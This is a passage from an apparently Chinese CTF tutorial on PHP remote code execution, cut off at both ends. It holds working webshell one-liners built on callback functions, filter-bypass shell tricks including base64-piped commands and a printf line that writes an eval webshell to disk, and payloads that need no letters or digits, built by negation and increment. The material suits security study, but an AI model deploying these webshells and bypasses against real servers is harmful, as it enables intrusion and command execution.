php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</span></span><br><span class="line"><span class="comment">#命令执行http://localhost/123.php?func=system   cmd=whoami</span></span><br><span class="line"><span class="comment">#菜刀连接http://localhost/123.php?func=assert   密码：cmd</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br></pre></td></tr></table></figure><p><strong>call_user_func()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#传入的参数作为assert函数的参数</span></span><br><span class="line"><span class="comment">#cmd=system(whoami)</span></span><br><span class="line"><span class="comment">#菜刀连接密码：cmd</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><strong>call_user_func_array()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将传入的参数作为数组的第一个值传递给assert函数</span></span><br><span class="line"><span class="comment">#cmd=system(whoami)</span></span><br><span class="line"><span class="comment">#菜刀连接密码：cmd</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br></pre></td></tr></table></figure><p><strong>array_filter()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用回调函数过滤数组中的元素：array_filter(数组,函数)</span></span><br><span class="line"><span class="comment">#命令执行func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">#菜刀连接http://localhost/123.php?func=assert  密码cmd</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><p><strong>uasort()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php环境&gt;=&lt;5.6才能用</span></span><br><span class="line"><span class="comment">#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</span></span><br><span class="line"><span class="comment">#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);</span></span><br><span class="line"><span class="comment">#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="三、例题"><a href="#三、例题" class="headerlink" title="三、例题"></a>三、例题</h2><ul><li><a href="https://www.nssctf.cn/problem/424">https://www.nssctf.cn/problem/424</a></li><li><a href="https://www.nssctf.cn/problem/383">https://www.nssctf.cn/problem/383</a></li><li><a href="https://www.nssctf.cn/problem/425">https://www.nssctf.cn/problem/425</a></li><li><a href="https://www.nssctf.cn/problem/3090">https://www.nssctf.cn/problem/3090</a></li></ul><h2 id="四、绕过方式"><a href="#四、绕过方式" class="headerlink" title="四、绕过方式"></a>四、绕过方式</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#常见的绕过符号有：</span></span><br><span class="line">$IFS$<span class="number">9</span> 、$&#123;IFS&#125; 、%<span class="number">09</span>(php环境下)、 重定向符&lt;&gt;、&lt;、</span><br><span class="line"></span><br><span class="line"><span class="comment">#$IFS在linux下表示分隔符，如果不加&#123;&#125;则bash会将IFS解释为一个变量名，加一个&#123;&#125;就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用</span></span><br></pre></td></tr></table></figure><h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>a  <span class="comment">#换行符，需要php环境</span></span><br><span class="line">%<span class="number">0</span>d  <span class="comment">#回车符，需要php环境</span></span><br><span class="line">;    <span class="comment">#在 shell 中，是”连续指令”</span></span><br><span class="line">&amp;    <span class="comment">#不管第一条命令成功与否，都会执行第二条命令</span></span><br><span class="line">&amp;&amp;   <span class="comment">#第一条命令成功，第二条才会执行</span></span><br><span class="line">|    <span class="comment">#第一条命令的结果，作为第二条命令的输入</span></span><br><span class="line">||   <span class="comment">#第一条命令失败，第二条才会执行</span></span><br></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>假如过滤了关键字cat\flag，无法读取不了flag.php，又该如何去做</p><p>拼接绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行ls命令：</span></span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br><span class="line"><span class="comment">#cat flag文件内容：</span></span><br><span class="line">a=c;b=at;c=f;d=lag;$a<span class="variable">$b</span> $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"><span class="comment">#cat test文件内容</span></span><br><span class="line">a=<span class="string">&quot;ccaatt&quot;</span>;b=$&#123;a:<span class="number">0</span>:<span class="number">1</span>&#125;$&#123;a:<span class="number">2</span>:<span class="number">1</span>&#125;$&#123;a:<span class="number">4</span>:<span class="number">1</span>&#125;;<span class="variable">$b</span> test</span><br></pre></td></tr></table></figure><p>编码绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash  ==&gt; cat /flag</span><br><span class="line"><span class="keyword">echo</span> Y2F0IC9mbGFn|base64 -d|sh      ==&gt; cat /flag</span><br><span class="line"><span class="comment">#hex</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;0x636174202f666c6167&quot;</span> | xxd -r -p|bash   ==&gt; cat /flag</span><br><span class="line"><span class="comment">#oct/字节</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>) ==&gt;ls</span><br><span class="line">$(printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;cat /flag</span><br><span class="line">&#123;printf,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\$<span class="number">0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#i也可以通过这种方式写马</span></span><br><span class="line"><span class="comment">#内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">$&#123;printf,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>单引号和双引号绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&#x27;a&#x27;</span>t test</span><br><span class="line">c<span class="string">&quot;a&quot;</span>t test</span><br></pre></td></tr></table></figure><p>反斜杠绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t test</span><br></pre></td></tr></table></figure><p>通过$PATH绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</span></span><br><span class="line"><span class="comment">#当执行程序时，shell自动跟据PATH变量的值去搜索该程序</span></span><br><span class="line"><span class="comment">#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$PATH</span> </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">`<span class="keyword">echo</span> <span class="variable">$PATH</span>| cut -c <span class="number">8</span>,<span class="number">9</span>`t test</span><br></pre></td></tr></table></figure><p>通配符绕过</p><blockquote><ol><li>[…]表示匹配方括号之中的任意一个字符</li><li>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</li><li>{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat t?st</span><br><span class="line">cat te*</span><br><span class="line">cat t[a-z]st</span><br><span class="line">cat t&#123;a,b,c,d,e,f&#125;st</span><br></pre></td></tr></table></figure><h1 id="PHP-RCE-进阶技巧"><a href="#PHP-RCE-进阶技巧" class="headerlink" title="PHP RCE 进阶技巧"></a>PHP RCE 进阶技巧</h1><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ul><li><p><a href="https://www.nssctf.cn/problem/439">https://www.nssctf.cn/problem/439</a></p></li><li><p><a href="https://www.nssctf.cn/problem/467">https://www.nssctf.cn/problem/467</a></p></li><li><a href="https://www.nssctf.cn/problem/1095">https://www.nssctf.cn/problem/1095</a></li><li><a href="https://ctf.xidian.edu.cn/training/19?challenge=779">https://ctf.xidian.edu.cn/training/19?challenge=779</a></li></ul><h2 id="一、无字母数字RCE"><a href="#一、无字母数字RCE" class="headerlink" title="一、无字母数字RCE"></a>一、无字母数字RCE</h2><h3 id="技术原理与背景"><a href="#技术原理与背景" class="headerlink" title="技术原理与背景"></a>技术原理与背景</h3><p>无字母数字RCE是指在不使用任何字母(a-z,A-Z)和数字(0-9)的情况下实现代码执行的技巧。这种技术在以下场景特别有用：</p><ul><li>过滤了所有字母和数字的CTF题目</li><li>严格的WAF规则过滤了常规payload</li><li>需要绕过字符限制的实战环境</li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路：</p><p>利用各种<strong>非数字字母的字符</strong>，经过各种<strong>变换（异或，取反，自增）</strong>，构造出<strong>单个的字母字符</strong>，然后把单个字符<strong>拼接成函数名</strong>，进行动态执行。</p><h3 id="核心实现方法"><a href="#核心实现方法" class="headerlink" title="核心实现方法"></a>核心实现方法</h3><h4 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或"></a>1.异或</h4><p>php7有一种特性叫做函数的<strong>动态调用</strong>，即在字符串上加一个括号就可以调用和字符串同名的函数</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&quot;phpinfo&quot;</span>)();</span><br></pre></td></tr></table></figure><p>而其中的字符串可以是任意形式，例如拼接：<code>(&quot;php&quot;.&quot;info&quot;)</code> 或者<strong>运算的结果</strong></p><p>异或运算，本质是得到这样的字符串然后括起来，进行命令操作</p><p>这里的异或，指的是php按位异或，在php 中，两个字符异或后，得到的依然是一个字符！</p><p>例如：将字符“A”和“?”进行异或：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;A&quot;</span> ^ <span class="string">&quot;?&quot;</span>;</span><br></pre></td></tr></table></figure><p>得到：<code>~</code></p><p>它是如何计算的呢，过程如下：</p><p>首先将 A 和 ? 分别转换为对应的ASCII码，A变为65，?变为63</p><p>然后将其转换为对应的二进制数，A变为1000001，？变为111111 接下来就进行运算，异或的运算规则是相同为0，不同为1 </p><pre><code>A:        1000001?:        0111111(少一位，前面补0) 结果：      1111110</code></pre><p>接下来将其二进制转换为对应十进制数，1111110对应的十进制数为126，根据ASCII码表可知126对应的是~，所以这个时候得到的字符就是~<br>因此，我们利用这种思路，就可以借助异或构造payload。</p><h4 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反"></a>2.取反</h4><p>取反其实是利用了<strong>不可见字符</strong>，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的</p><p>取反运算符(~)的作用</p><p>在PHP中，<code>~</code>是按位取反运算符，它对一个数的每一位二进制位进行取反操作（0变1，1变0）9。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ~<span class="number">3</span>; <span class="comment">// 输出-4</span></span><br><span class="line"><span class="keyword">echo</span> ~<span class="string">&#x27;a&#x27;</span>; <span class="comment">// 输出一个不可见字符</span></span><br></pre></td></tr></table></figure><p>取反绕过的核心是：</p><ol><li>将想要执行的PHP代码进行取反操作</li><li>将取反后的结果进行URL编码</li><li>通过eval等函数执行取反后的代码</li></ol><p>因为取反后的字符大多是不可见字符，可以绕过基于正则表达式的字符过滤。</p><p><strong>具体实现步骤</strong></p><p>基本payload构造:</p><p>假设我们要执行<code>phpinfo();</code>，可以按照以下步骤构造payload：</p><ol><li>对”phpinfo”进行取反：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ~<span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 输出不可见字符</span></span><br></pre></td></tr></table></figure><ol><li>对取反结果进行URL编码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>); <span class="comment">// 输出&quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure><ol><li>最终payload格式：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><p>注意括号的使用：取反部分要用括号括起来，最后的分号不能少5。</p><p>以CTF题目为例，当遇到如下过滤条件时：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>我们可以使用取反绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();  <span class="comment">// 执行phpinfo()</span></span><br><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">9</span>C%<span class="number">92</span>%<span class="number">9</span>B%A2%D6%D6);</span><br><span class="line"><span class="comment">// 相当于assert(eval($_POST[cmd]));</span></span><br></pre></td></tr></table></figure><p><strong>可以使用以下PHP代码生成取反payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始函数: &quot;</span>.<span class="variable">$func</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;取反结果: &quot;</span>.~<span class="variable">$func</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码: &quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$func</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h4><p><strong>什么是自增绕过？</strong></p><p>自增绕过是一种在PHP代码中，当字母和数字被严格过滤时，通过利用PHP的类型转换和自增运算符(++)特性来构造所需字符的技术。它允许攻击者在无法直接输入字母数字的情况下，逐步”构建”出执行命令所需的字符7。</p><p>基本行为：</p><p>在PHP中，自增运算符有两种形式：</p><ul><li>前置自增(<code>++$a</code>)：先增加变量的值，然后返回新值</li><li>后置自增(<code>$a++</code>)：先返回变量的当前值，然后增加变量的值</li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment">// 输出&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>++; <span class="comment">// 输出&#x27;B&#x27;(但$a的值变为&#x27;C&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>为什么自增可以用于RCE绕过？</strong></p><p>当Web应用过滤了所有字母和数字时，传统的RCE方法(如直接输入<code>system(&#39;ls&#39;)</code>)无法使用。但PHP中：</p><ul><li>空数组<code>[]</code>可以转换为字符串’Array’</li><li>字符串可以通过自增逐步构建出需要的字符</li><li>利用这些特性可以构造出函数名和参数7</li></ul><p><strong>核心原理:</strong></p><ol><li>从空数组开始构建字符串</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = [];        <span class="comment">// 创建一个空数组</span></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];   <span class="comment">// 尝试访问不存在的键，返回NULL并转换为空字符串</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// &#x27;!&#x27;==&#x27;@&#x27;返回false，转换为0，相当于$_ = $_[0]</span></span><br></pre></td></tr></table></figure><ol><li>利用自增构建字符</li></ol><p>PHP中字符串的自增遵循字母表顺序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$_</span>; <span class="comment">// 输出&#x27;B&#x27;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$_</span>; <span class="comment">// 输出&#x27;AA&#x27; (类似于Excel的列命名)</span></span><br></pre></td></tr></table></figure><ol><li>构建完整函数调用</li></ol><p>通过逐步自增，可以从空字符串开始构建出如<code>assert</code>、<code>system</code>等关键函数名，以及执行命令所需的参数7。</p><p><strong>Payload解析</strong></p><p>下面是一个典型的自增绕过Payload，用于执行<code>assert($_POST[_])</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;         <span class="comment">// $_ = &#x27;Array&#x27;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];   <span class="comment">// $_ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;           <span class="comment">// $___ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// $__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过18次自增，$__ = &#x27;S&#x27;</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;         <span class="comment">// $___ = &#x27;AS&#x27;</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;         <span class="comment">// $___ = &#x27;ASS&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过4次自增，$__ = &#x27;E&#x27;</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;         <span class="comment">// $___ = &#x27;ASSE&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过17次自增，$__ = &#x27;R&#x27;</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;         <span class="comment">// $___ = &#x27;ASSER&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过19次自增，$__ = &#x27;T&#x27;</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;         <span class="comment">// $___ = &#x27;ASSERT&#x27;</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;         <span class="comment">// $____ = &#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="comment">// 经过15次自增，$__ = &#x27;P&#x27;</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;        <span class="comment">// $____ = &#x27;_P&#x27;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;            <span class="comment">// 重置$__ = &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 